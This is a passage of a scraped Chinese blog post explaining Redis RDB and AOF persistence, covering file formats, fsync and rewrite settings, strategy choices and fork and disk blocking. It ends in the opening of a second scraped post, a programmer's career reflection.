RDB文件</h2>\n<p>RDB文件是经过压缩的二进制文件，下面介绍关于RDB文件的一些细节。</p>\n<p><strong>存储路径</strong></p>\n<p>RDB文件的存储路径既可以在启动前配置，也可以通过命令动态设定。</p>\n<p>配置：dir配置指定目录，dbfilename指定文件名。默认是Redis根目录下的dump.rdb文件。</p>\n<p>动态设定：Redis启动后也可以动态修改RDB存储路径，在磁盘损害或空间不足时非常有用；执行命令为config set dir {newdir}和config set dbfilename {newFileName}。如下所示(Windows环境)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d9908e2d6d9a38ed4b11ae1f2e976cd1.png\" alt=\"\"></p>\n<p><strong>RDB文件格式</strong></p>\n<p>RDB文件格式如下图所示（图片来源：《Redis设计与实现》）：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/58d5a97304a02565e67339cabadade6c.png\" alt=\"\"></p>\n<p>其中各个字段的含义说明如下：</p>\n<p>1)  REDIS：常量，保存着”REDIS”5个字符。</p>\n<p>2)  db_version：RDB文件的版本号，注意不是Redis的版本号。</p>\n<p>3)  SELECTDB 0 pairs：表示一个完整的数据库(0号数据库)，同理SELECTDB 3 pairs表示完整的3号数据库；只有当数据库中有键值对时，RDB文件中才会有该数据库的信息(上图所示的Redis中只有0号和3号数据库有键值对)；如果Redis中所有的数据库都没有键值对，则这一部分直接省略。其中：SELECTDB是一个常量，代表后面跟着的是数据库号码；0和3是数据库号码；pairs则存储了具体的键值对信息，包括key、value值，及其数据类型、内部编码、过期时间、压缩信息等等。</p>\n<p>4)  EOF：常量，标志RDB文件正文内容结束。</p>\n<p>5)  check_sum：前面所有内容的校验和；Redis在载入RBD文件时，会计算前面的校验和并与check_sum值比较，判断文件是否损坏。</p>\n<p><strong>压缩</strong></p>\n<p>Redis默认采用LZF算法对RDB文件进行压缩。虽然压缩耗时，但是可以大大减小RDB文件的体积，因此压缩默认开启；可以通过命令关闭：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4d88ca2d61427189a211b9652d4d5dc6.png\" alt=\"\"></p>\n<p>需要注意的是，RDB文件的压缩并不是针对整个文件进行的，而是对数据库中的字符串进行的，且只有在字符串达到一定长度(20字节)时才会进行。</p>\n<h2>4. 启动时加载</h2>\n<p>RDB文件的载入工作是在服务器启动时自动执行的，并没有专门的命令。但是由于AOF的优先级更高，因此当AOF开启时，Redis会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会在Redis服务器启动时检测RDB文件，并自动载入。服务器载入RDB文件期间处于阻塞状态，直到载入完成为止。</p>\n<p>Redis启动日志中可以看到自动载入的执行：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1ae2921155458ca1803759968945bc9f.png\" alt=\"\"></p>\n<p>Redis载入RDB文件时，会对RDB文件进行校验，如果文件损坏，则日志中会打印错误，Redis启动失败。</p>\n<h2>5. RDB常用配置总结</h2>\n<p>下面是RDB常用的配置项，以及默认值；前面介绍过的这里不再详细介绍。</p>\n<ul>\n<li>save m n：bgsave自动触发的条件；如果没有save m n配置，相当于自动的RDB持久化关闭，不过此时仍可以通过其他方式触发</li>\n<li>stop-writes-on-bgsave-error yes：当bgsave出现错误时，Redis是否停止执行写命令；设置为yes，则当硬盘出现问题时，可以及时发现，避免数据的大量丢失；设置为no，则Redis无视bgsave的错误继续执行写命令，当对Redis服务器的系统(尤其是硬盘)使用了监控时，该选项考虑设置为no</li>\n<li>rdbcompression yes：是否开启RDB文件压缩</li>\n<li>rdbchecksum yes：是否开启RDB文件的校验，在写入文件和读取文件时都起作用；关闭checksum在写入文件和启动文件时大约能带来10%的性能提升，但是数据损坏时无法发现</li>\n<li>dbfilename dump.rdb：RDB文件名</li>\n<li>dir ./：RDB文件和AOF文件所在目录</li>\n</ul>\n<h1>四、AOF持久化</h1>\n<p>RDB持久化是将进程数据写入文件，而AOF持久化(即Append Only File持久化)，则是将Redis执行的每次写命令记录到单独的日志文件中（有点像MySQL的binlog）；当Redis重启时再次执行AOF文件中的命令来恢复数据。</p>\n<p>与RDB相比，AOF的实时性更好，因此已成为主流的持久化方案。</p>\n<h2>1. 开启AOF</h2>\n<p>Redis服务器默认开启RDB，关闭AOF；要开启AOF，需要在配置文件中配置：</p>\n<p>appendonly yes</p>\n<h2>2. 执行流程</h2>\n<p>由于需要记录Redis的每条写命令，因此AOF不需要触发，下面介绍AOF的执行流程。</p>\n<p>AOF的执行流程包括：</p>\n<ul>\n<li>命令追加(append)：将Redis的写命令追加到缓冲区aof_buf；</li>\n<li>文件写入(write)和文件同步(sync)：根据不同的同步策略将aof_buf中的内容同步到硬盘；</li>\n<li>文件重写(rewrite)：定期重写AOF文件，达到压缩的目的。</li>\n</ul>\n<h3>1) 命令追加(append)</h3>\n<p>Redis先将写命令追加到缓冲区，而不是直接写入文件，主要是为了避免每次有写命令都直接写入硬盘，导致硬盘IO成为Redis负载的瓶颈。</p>\n<p>命令追加的格式是Redis命令请求的协议格式，它是一种纯文本格式，具有兼容性好、可读性强、容易处理、操作简单避免二次开销等优点；具体格式略。在AOF文件中，除了用于指定数据库的select命令（如select 0 为选中0号数据库）是由Redis添加的，其他都是客户端发送来的写命令。</p>\n<h3>2) 文件写入(write)和文件同步(sync)</h3>\n<p>Redis提供了多种AOF缓存区的同步文件策略，策略涉及到操作系统的write函数和fsync函数，说明如下：</p>\n<p>为了提高文件写入效率，在现代操作系统中，当用户调用write函数将数据写入文件时，操作系统通常会将数据暂存到一个内存缓冲区里，当缓冲区被填满或超过了指定时限后，才真正将缓冲区的数据写入到硬盘里。这样的操作虽然提高了效率，但也带来了安全问题：如果计算机停机，内存缓冲区中的数据会丢失；因此系统同时提供了fsync、fdatasync等同步函数，可以强制操作系统立刻将缓冲区中的数据写入到硬盘里，从而确保数据的安全性。</p>\n<p>AOF缓存区的同步文件策略由参数appendfsync控制，各个值的含义如下：</p>\n<ul>\n<li>always：命令写入aof_buf后立即调用系统fsync操作同步到AOF文件，fsync完成后线程返回。这种情况下，每次有写命令都要同步到AOF文件，硬盘IO成为性能瓶颈，Redis只能支持大约几百TPS写入，严重降低了Redis的性能；即便是使用固态硬盘（SSD），每秒大约也只能处理几万个命令，而且会大大降低SSD的寿命。</li>\n<li>no：命令写入aof_buf后调用系统write操作，不对AOF文件做fsync同步；同步由操作系统负责，通常同步周期为30秒。这种情况下，文件同步的时间不可控，且缓冲区中堆积的数据会很多，数据安全性无法保证。</li>\n<li>everysec：命令写入aof_buf后调用系统write操作，write完成后线程返回；fsync同步文件操作由专门的线程每秒调用一次。<strong>everysec是前述两种策略的折中，是性能和数据安全性的平衡，因此是Redis的默认配置，也是我们推荐的配置。</strong></li>\n</ul>\n<h3>3) 文件重写(rewrite)</h3>\n<p>随着时间流逝，Redis服务器执行的写命令越来越多，AOF文件也会越来越大；过大的AOF文件不仅会影响服务器的正常运行，也会导致数据恢复需要的时间过长。</p>\n<p>文件重写是指定期重写AOF文件，减小AOF文件的体积。需要注意的是，<strong>AOF重写是把Redis进程内的数据转化为写命令，同步到新的AOF文件；不会对旧的AOF文件进行任何读取、写入操作!</strong></p>\n<p>关于文件重写需要注意的另一点是：对于AOF持久化来说，文件重写虽然是强烈推荐的，但并不是必须的；即使没有文件重写，数据也可以被持久化并在Redis启动的时候导入；因此在一些实现中，会关闭自动的文件重写，然后通过定时任务在每天的某一时刻定时执行。</p>\n<p>文件重写之所以能够压缩AOF文件，原因在于：</p>\n<ul>\n<li>过期的数据不再写入文件</li>\n<li>无效的命令不再写入文件：如有些数据被重复设值(set mykey v1, set mykey v2)、有些数据被删除了(sadd myset v1, del myset)等等</li>\n<li>多条命令可以合并为一个：如sadd myset v1, sadd myset v2, sadd myset v3可以合并为sadd myset v1 v2 v3。不过为了防止单条命令过大造成客户端缓冲区溢出，对于list、set、hash、zset类型的key，并不一定只使用一条命令；而是以某个常量为界将命令拆分为多条。这个常量在redis.h/REDIS_AOF_REWRITE_ITEMS_PER_CMD中定义，不可更改，3.0版本中值是64。</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dbd265625fa30c7c5837136e70171248.png\" alt=\"\"></p>\n<p>通过上述内容可以看出，由于重写后AOF执行的命令减少了，文件重写既可以减少文件占用的空间，也可以加快恢复速度。</p>\n<p><strong>文件重写的触发</strong></p>\n<p>文件重写的触发，分为手动触发和自动触发：</p>\n<p>手动触发：直接调用bgrewriteaof命令，该命令的执行与bgsave有些类似：都是fork子进程进行具体的工作，且都只有在fork时阻塞。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a3bfe8ea04147795290a39f4debe1602.png\" alt=\"\"></p>\n<p>此时服务器执行日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c81bed0689ff70ea950574eacb26684c.png\" alt=\"\"></p>\n<p>自动触发：根据auto-aof-rewrite-min-size和auto-aof-rewrite-percentage参数，以及aof_current_size和aof_base_size状态确定触发时机。</p>\n<ul>\n<li>auto-aof-rewrite-min-size：执行AOF重写时，文件的最小体积，默认值为64MB。</li>\n<li>auto-aof-rewrite-percentage：执行AOF重写时，当前AOF大小(即aof_current_size)和上一次重写时AOF大小(aof_base_size)的比值。</li>\n</ul>\n<p>其中，参数可以通过config get命令查看：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/ab802fac49820819fd9f5896ebaaaeb5.png\" alt=\"\"></p>\n<p>状态可以通过info persistence查看：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/e1385eb5e949e1cd2155ec601ad65fb7.png\" alt=\"\"></p>\n<p>只有当auto-aof-rewrite-min-size和auto-aof-rewrite-percentage两个参数同时满足时，才会自动触发AOF重写，即bgrewriteaof操作。</p>\n<p>自动触发bgrewriteaof时，可以看到服务器日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/402b56947d9affe03aa1e13bad670e45.png\" alt=\"\"></p>\n<p><strong>文件重写的流程</strong></p>\n<p>文件重写流程如下图所示(图片来源：http://www.cnblogs.com/yangmingxianshen/p/8373205.html)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1324311267755f0686b519bb6064f99f.png\" alt=\"\"></p>\n<p>关于文件重写的流程，有两点需要特别注意：(1)重写由父进程fork子进程进行；(2)重写期间Redis执行的写命令，需要追加到新的AOF文件中，为此Redis引入了aof_rewrite_buf缓存。</p>\n<p>对照上图，文件重写的流程如下：</p>\n<p>1) Redis父进程首先判断当前是否存在正在执行 bgsave/bgrewriteaof的子进程，如果存在则bgrewriteaof命令直接返回，如果存在bgsave命令则等bgsave执行完成后再执行。前面曾介绍过，这个主要是基于性能方面的考虑。</p>\n<p>2) 父进程执行fork操作创建子进程，这个过程中父进程是阻塞的。</p>\n<p>3.1) 父进程fork后，bgrewriteaof命令返回”Background append only file rewrite started”信息并不再阻塞父进程，并可以响应其他命令。<strong>Redis的所有写命令依然写入AOF缓冲区，并根据appendfsync策略同步到硬盘，保证原有AOF机制的正确。</strong></p>\n<p>3.2) 由于fork操作使用写时复制技术，子进程只能共享fork操作时的内存数据。<strong>由于父进程依然在响应命令，因此Redis使用AOF重写缓冲区(图中的aof_rewrite_buf)保存这部分数据，防止新AOF文件生成期间丢失这部分数据。也就是说，bgrewriteaof执行期间，Redis的写命令同时追加到aof_buf和aof_rewirte_buf两个缓冲区。</strong></p>\n<p>4) 子进程根据内存快照，按照命令合并规则写入到新的AOF文件。</p>\n<p>5.1) 子进程写完新的AOF文件后，向父进程发信号，父进程更新统计信息，具体可以通过info persistence查看。</p>\n<p>5.2) 父进程把AOF重写缓冲区的数据写入到新的AOF文件，这样就保证了新AOF文件所保存的数据库状态和服务器当前状态一致。</p>\n<p>5.3) 使用新的AOF文件替换老文件，完成AOF重写。</p>\n<h2>3. 启动时加载</h2>\n<p>前面提到过，当AOF开启时，Redis启动时会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会载入RDB文件恢复数据。</p>\n<p>当AOF开启，且AOF文件存在时，Redis启动日志：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d49381c9c2e7613607d5ea44f4e01e8a.png\" alt=\"\"></p>\n<p>当AOF开启，但AOF文件不存在时，即使RDB文件存在也不会加载(更早的一些版本可能会加载，但3.0不会)，Redis启动日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/6bc3128e30e32da4892e6838adbcab3c.png\" alt=\"\"></p>\n<p><strong>文件校验</strong></p>\n<p>与载入RDB文件类似，Redis载入AOF文件时，会对AOF文件进行校验，如果文件损坏，则日志中会打印错误，Redis启动失败。但如果是AOF文件结尾不完整(机器突然宕机等容易导致文件尾部不完整)，且aof-load-truncated参数开启，则日志中会输出警告，Redis忽略掉AOF文件的尾部，启动成功。aof-load-truncated参数默认是开启的：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1355e2b884fc0fd4dd40a6aba7dad6da.png\" alt=\"\"></p>\n<p><strong>伪客户端</strong></p>\n<p>因为Redis的命令只能在客户端上下文中执行，而载入AOF文件时命令是直接从文件中读取的，并不是由客户端发送；因此Redis服务器在载入AOF文件之前，会创建一个没有网络连接的客户端，之后用它来执行AOF文件中的命令，命令执行的效果与带网络连接的客户端完全一样。</p>\n<h2>4. AOF常用配置总结</h2>\n<p>下面是AOF常用的配置项，以及默认值；前面介绍过的这里不再详细介绍。</p>\n<ul>\n<li>appendonly no：是否开启AOF</li>\n<li>appendfilename “appendonly.aof”：AOF文件名</li>\n<li>dir ./：RDB文件和AOF文件所在目录</li>\n<li>appendfsync everysec：fsync持久化策略</li>\n<li>no-appendfsync-on-rewrite no：AOF重写期间是否禁止fsync；如果开启该选项，可以减轻文件重写时CPU和硬盘的负载（尤其是硬盘），但是可能会丢失AOF重写期间的数据；需要在负载和安全性之间进行平衡</li>\n<li>auto-aof-rewrite-percentage 100：文件重写触发条件之一</li>\n<li>auto-aof-rewrite-min-size 64mb：文件重写触发提交之一</li>\n<li>aof-load-truncated yes：如果AOF文件结尾损坏，Redis启动时是否仍载入AOF文件</li>\n</ul>\n<h1>五、方案选择与常见问题</h1>\n<p>前面介绍了RDB和AOF两种持久化方案的细节，下面介绍RDB和AOF的特点、如何选择持久化方案，以及在持久化过程中常遇到的问题等。</p>\n<h2>1. RDB和AOF的优缺点</h2>\n<p>RDB和AOF各有优缺点：</p>\n<p><strong>RDB持久化</strong></p>\n<p>优点：RDB文件紧凑，体积小，网络传输快，适合全量复制；恢复速度比AOF快很多。当然，与AOF相比，RDB最重要的优点之一是对性能的影响相对较小。</p>\n<p>缺点：RDB文件的致命缺点在于其数据快照的持久化方式决定了必然做不到实时持久化，而在数据越来越重要的今天，数据的大量丢失很多时候是无法接受的，因此AOF持久化成为主流。此外，RDB文件需要满足特定格式，兼容性差（如老版本的Redis不兼容新版本的RDB文件）。</p>\n<p><strong>AOF持久化</strong></p>\n<p>与RDB持久化相对应，AOF的优点在于支持秒级持久化、兼容性好，缺点是文件大、恢复速度慢、对性能影响大。</p>\n<h2>2. 持久化策略选择</h2>\n<p>在介绍持久化策略之前，首先要明白无论是RDB还是AOF，持久化的开启都是要付出性能方面代价的：对于RDB持久化，一方面是bgsave在进行fork操作时Redis主进程会阻塞，另一方面，子进程向硬盘写数据也会带来IO压力；对于AOF持久化，向硬盘写数据的频率大大提高(everysec策略下为秒级)，IO压力更大，甚至可能造成AOF追加阻塞问题（后面会详细介绍这种阻塞），此外，AOF文件的重写与RDB的bgsave类似，会有fork时的阻塞和子进程的IO压力问题。相对来说，由于AOF向硬盘中写数据的频率更高，因此对Redis主进程性能的影响会更大。</p>\n<p>在实际生产环境中，根据数据量、应用对数据的安全要求、预算限制等不同情况，会有各种各样的持久化策略；如完全不使用任何持久化、使用RDB或AOF的一种，或同时开启RDB和AOF持久化等。此外，持久化的选择必须与Redis的主从策略一起考虑，因为主从复制与持久化同样具有数据备份的功能，而且主机master和从机slave可以独立的选择持久化方案。</p>\n<p>下面分场景来讨论持久化策略的选择，下面的讨论也只是作为参考，实际方案可能更复杂更具多样性。</p>\n<p>（1）如果Redis中的数据完全丢弃也没有关系（如Redis完全用作DB层数据的cache），那么无论是单机，还是主从架构，都可以不进行任何持久化。</p>\n<p>（2）在单机环境下（对于个人开发者，这种情况可能比较常见），如果可以接受十几分钟或更多的数据丢失，选择RDB对Redis的性能更加有利；如果只能接受秒级别的数据丢失，应该选择AOF。</p>\n<p>（3）但在多数情况下，我们都会配置主从环境，slave的存在既可以实现数据的热备，也可以进行读写分离分担Redis读请求，以及在master宕掉后继续提供服务。</p>\n<p>在这种情况下，一种可行的做法是：</p>\n<p>master：完全关闭持久化（包括RDB和AOF），这样可以让master的性能达到最好</p>\n<p>slave：关闭RDB，开启AOF（如果对数据安全要求不高，开启RDB关闭AOF也可以），并定时对持久化文件进行备份（如备份到其他文件夹，并标记好备份的时间）；然后关闭AOF的自动重写，然后添加定时任务，在每天Redis闲时（如凌晨12点）调用bgrewriteaof。</p>\n<p>这里需要解释一下，为什么开启了主从复制，可以实现数据的热备份，还需要设置持久化呢？因为在一些特殊情况下，主从复制仍然不足以保证数据的安全，例如：</p>\n<ul>\n<li>master和slave进程同时停止：考虑这样一种场景，如果master和slave在同一栋大楼或同一个机房，则一次停电事故就可能导致master和slave机器同时关机，Redis进程停止；如果没有持久化，则面临的是数据的完全丢失。</li>\n<li>master误重启：考虑这样一种场景，master服务因为故障宕掉了，如果系统中有自动拉起机制（即检测到服务停止后重启该服务）将master自动重启，由于没有持久化文件，那么master重启后数据是空的，slave同步数据也变成了空的；如果master和slave都没有持久化，同样会面临数据的完全丢失。需要注意的是，即便是使用了哨兵(关于哨兵后面会有文章介绍)进行自动的主从切换，也有可能在哨兵轮询到master之前，便被自动拉起机制重启了。因此，应尽量避免“自动拉起机制”和“不做持久化”同时出现。</li>\n</ul>\n<p>（4）异地灾备：上述讨论的几种持久化策略，针对的都是一般的系统故障，如进程异常退出、宕机、断电等，这些故障不会损坏硬盘。但是对于一些可能导致硬盘损坏的灾难情况，如火灾地震，就需要进行异地灾备。例如对于单机的情形，可以定时将RDB文件或重写后的AOF文件，通过scp拷贝到远程机器，如阿里云、AWS等；对于主从的情形，可以定时在master上执行bgsave，然后将RDB文件拷贝到远程机器，或者在slave上执行bgrewriteaof重写AOF文件后，将AOF文件拷贝到远程机器上。一般来说，由于RDB文件文件小、恢复快，因此灾难恢复常用RDB文件；异地备份的频率根据数据安全性的需要及其他条件来确定，但最好不要低于一天一次。</p>\n<h2>3. fork阻塞：CPU的阻塞</h2>\n<p>在Redis的实践中，众多因素限制了Redis单机的内存不能过大，例如：</p>\n<ul>\n<li>当面对请求的暴增，需要从库扩容时，Redis内存过大会导致扩容时间太长；</li>\n<li>当主机宕机时，切换主机后需要挂载从库，Redis内存过大导致挂载速度过慢；</li>\n<li>以及持久化过程中的fork操作，下面详细说明。</li>\n</ul>\n<p>首先说明一下fork操作：</p>\n<p>父进程通过fork操作可以创建子进程；子进程创建后，父子进程共享代码段，不共享进程的数据空间，但是子进程会获得父进程的数据空间的副本。在操作系统fork的实际实现中，基本都采用了写时复制技术，即在父/子进程试图修改数据空间之前，父子进程实际上共享数据空间；但是当父/子进程的任何一个试图修改数据空间时，操作系统会为修改的那一部分(内存的一页)制作一个副本。</p>\n<p>虽然fork时，子进程不会复制父进程的数据空间，但是会复制内存页表（页表相当于内存的索引、目录）；父进程的数据空间越大，内存页表越大，fork时复制耗时也会越多。</p>\n<p>在Redis中，无论是RDB持久化的bgsave，还是AOF重写的bgrewriteaof，都需要fork出子进程来进行操作。如果Redis内存过大，会导致fork操作时复制内存页表耗时过多；而Redis主进程在进行fork时，是完全阻塞的，也就意味着无法响应客户端的请求，会造成请求延迟过大。</p>\n<p>对于不同的硬件、不同的操作系统，fork操作的耗时会有所差别，一般来说，如果Redis单机内存达到了10GB，fork时耗时可能会达到百毫秒级别（如果使用Xen虚拟机，这个耗时可能达到秒级别）。因此，一般来说Redis单机内存一般要限制在10GB以内；不过这个数据并不是绝对的，可以通过观察线上环境fork的耗时来进行调整。观察的方法如下：执行命令info stats，查看latest_fork_usec的值，单位为微秒。</p>\n<p>为了减轻fork操作带来的阻塞问题，除了控制Redis单机内存的大小以外，还可以适度放宽AOF重写的触发条件、选用物理机或高效支持fork操作的虚拟化技术等，例如使用Vmware或KVM虚拟机，不要使用Xen虚拟机。</p>\n<h2>4. AOF追加阻塞：硬盘的阻塞</h2>\n<p>前面提到过，在AOF中，如果AOF缓冲区的文件同步策略为everysec，则：在主线程中，命令写入aof_buf后调用系统write操作，write完成后主线程返回；fsync同步文件操作由专门的文件同步线程每秒调用一次。</p>\n<p>这种做法的问题在于，如果硬盘负载过高，那么fsync操作可能会超过1s；如果Redis主线程持续高速向aof_buf写入命令，硬盘的负载可能会越来越大，IO资源消耗更快；如果此时Redis进程异常退出，丢失的数据也会越来越多，可能远超过1s。</p>\n<p>为此，Redis的处理策略是这样的：主线程每次进行AOF会对比上次fsync成功的时间；如果距上次不到2s，主线程直接返回；如果超过2s，则主线程阻塞直到fsync同步完成。因此，如果系统硬盘负载过大导致fsync速度太慢，会导致Redis主线程的阻塞；此外，使用everysec配置，AOF最多可能丢失2s的数据，而不是1s。</p>\n<p>AOF追加阻塞问题定位的方法：</p>\n<p>（1）监控info Persistence中的aof_delayed_fsync：当AOF追加阻塞发生时（即主线程等待fsync而阻塞），该指标累加。</p>\n<p>（2）AOF阻塞时的Redis日志：</p>\n<p>Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.</p>\n<p>（3）如果AOF追加阻塞频繁发生，说明系统的硬盘负载太大；可以考虑更换IO速度更快的硬盘，或者通过IO监控分析工具对系统的IO负载进行分析，如iostat（系统级io）、iotop（io版的top）、pidstat等。</p>\n<h2><a name=\"t55\"></a>5. info命令与持久化</h2>\n<p>前面提到了一些通过info命令查看持久化相关状态的方法，下面来总结一下。</p>\n<p>（1）info Persistence</p>\n<p>执行结果如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/f238e2d52950ad685901cade59bf8809.png\" alt=\"\"></p>\n<p>其中比较重要的包括：</p>\n<ul>\n<li>rdb_last_bgsave_status:上次bgsave 执行结果，可以用于发现bgsave错误</li>\n<li>rdb_last_bgsave_time_sec:上次bgsave执行时间（单位是s），可以用于发现bgsave是否耗时过长</li>\n<li>aof_enabled:AOF是否开启</li>\n<li>aof_last_rewrite_time_sec: 上次文件重写执行时间（单位是s），可以用于发现文件重写是否耗时过长</li>\n<li>aof_last_bgrewrite_status: 上次bgrewrite执行结果，可以用于发现bgrewrite错误</li>\n<li>aof_buffer_length和aof_rewrite_buffer_length:aof缓存区大小和aof重写缓冲区大小</li>\n<li>aof_delayed_fsync:AOF追加阻塞情况的统计</li>\n</ul>\n<p>（2）info stats</p>\n<p>其中与持久化关系较大的是：latest_fork_usec，代表上次fork耗时，可以参见前面的讨论。</p>\n<h1>六、总结</h1>\n<p>本文主要内容可以总结如下：</p>\n<p>1、持久化在Redis高可用中的作用：数据备份，与主从复制相比强调的是由内存到硬盘的备份。</p>\n<p>2、RDB持久化：将数据快照备份到硬盘；介绍了其触发条件（包括手动出发和自动触发）、执行流程、RDB文件等，特别需要注意的是文件保存操作由fork出的子进程来进行。</p>\n<p>3、AOF持久化：将执行的写命令备份到硬盘（类似于MySQL的binlog），介绍了其开启方法、执行流程等，特别需要注意的是文件同步策略的选择（everysec）、文件重写的流程。</p>\n<p>4、一些现实的问题：包括如何选择持久化策略，以及需要注意的fork阻塞、AOF追加阻塞等。</p>\n<h1>参考文献</h1>\n<p>《Redis开发与运维》</p>\n<p>《Redis设计与实现》</p>\n<p>《Redis实战》</p>\n<p><a href=\"http://www.redis.cn/topics/persistence.html\">http://www.redis.cn/topics/persistence.html</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/fpupqLp-wjR8fQvYSQhVLg\">https://mp.weixin.qq.com/s/fpupqLp-wjR8fQvYSQhVLg</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650764050&amp;idx=1&amp;sn=891287b9f99a8c1dd4ce9e1805646741&amp;chksm=f3f9c687c48e4f91c6631e7f5e36a9169c10549386bec541dbeef92ed0023a373f6ec25c2ef1&amp;mpshare=1&amp;scene=1&amp;srcid=0525xnHQxiFwpzFWSME2LQrb#rd\">https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650764050&amp;idx=1&amp;sn=891287b9f99a8c1dd4ce9e1805646741&amp;chksm=f3f9c687c48e4f91c6631e7f5e36a9169c10549386bec541dbeef92ed0023a373f6ec25c2ef1&amp;mpshare=1&amp;scene=1&amp;srcid=0525xnHQxiFwpzFWSME2LQrb#rd</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650763383&amp;idx=1&amp;sn=348a84605a7cdefe4e075c9f0310f257&amp;chksm=f3f9c5e2c48e4cf41bd3f708bce3f9a1302a699cf7defe611e9aea120fcb424944119e079362&amp;mpshare=1&amp;scene=1&amp;srcid=0525XIl8KXvHYvX42oaUcop0#rd\">https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650763383&amp;idx=1&amp;sn=348a84605a7cdefe4e075c9f0310f257&amp;chksm=f3f9c5e2c48e4cf41bd3f708bce3f9a1302a699cf7defe611e9aea120fcb424944119e079362&amp;mpshare=1&amp;scene=1&amp;srcid=0525XIl8KXvHYvX42oaUcop0#rd</a></p>\n<p><a href=\"https://blog.csdn.net/tonyxf121/article/details/8475603\">https://blog.csdn.net/tonyxf121/article/details/8475603</a></p>\n<p><a href=\"http://heylinux.com/archives/1932.html\">http://heylinux.com/archives/1932.html</a></p>\n<p><a href=\"https://www.m690.com/archives/380/\">https://www.m690.com/archives/380/</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114093\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114093votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114093\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"url_object_id": "c7bbdb3c6c79c01bffbefa062036a56f", "title": ["九年程序人生"], "url": "http://blog.jobbole.com/114124/", "create_date": "2018/06/14", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/2b70b826c50f6f6721d816371ec7fd6a.jpg"], "praise_nums": "1", "comment_nums": 1, "fav_nums": 1, "tags": "职场, 工作", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/flame7/p/9110579.html\">flame7</a>   </div><p>时间一晃而过，大学毕业转眼间已经工作9年了，总结一下自己这些年来感受。</p>\n<h2><strong>与程序打交道的人生，是简单的人生</strong></h2>\n<p>一次做规划局的项目，规划局的职员很是钦佩地说：“你们真了不起，在电脑上敲敲键盘就能做出软件来。”，</p>\n<p>规划局领导说：“跟电脑打交道是最简单的，难的是跟人打交道。”。</p>\n<p>领导的话很有深意，一语道破了本质，做程序的人，是比较简单的。</p>\n<h2><strong> 不懂什么叫编程</strong></h2>\n<p>大学本科，读“计算机科学与技术专业”（相信看这篇博客的人多半也是学这个专业的 ^_*），课程重理论而轻实践。</p>\n<p>最初学习C语言，对于编程没有任何概念，我清楚的记得，一次在课堂上问老师：“计算机输入法，可视化操作界面已经很完善了，为什么要用C语言中 Print() 